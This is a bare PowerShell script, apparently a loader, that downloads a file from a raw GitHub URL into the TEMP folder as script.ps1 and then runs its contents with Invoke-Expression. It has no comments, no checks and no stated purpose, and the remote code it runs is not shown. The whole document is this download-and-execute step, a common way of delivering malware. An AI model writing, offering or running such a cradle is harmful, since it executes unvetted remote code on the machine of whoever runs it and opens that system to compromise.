$sourceUrl = "https://raw.githubusercontent.com/vitorcilira/0/main/1"
$destinationFile = "$env:TEMP\script.ps1"

$webClient = New-Object System.Net.WebClient
$webClient.Encoding = [System.Text.Encoding]::UTF8
$webClient.DownloadFile($sourceUrl, $destinationFile)

$scriptContent = Get-Content -Path "$env:TEMP\script.ps1" -Encoding UTF8
$scriptContent = $scriptContent -join "`r`n"
Invoke-Expression $scriptContent
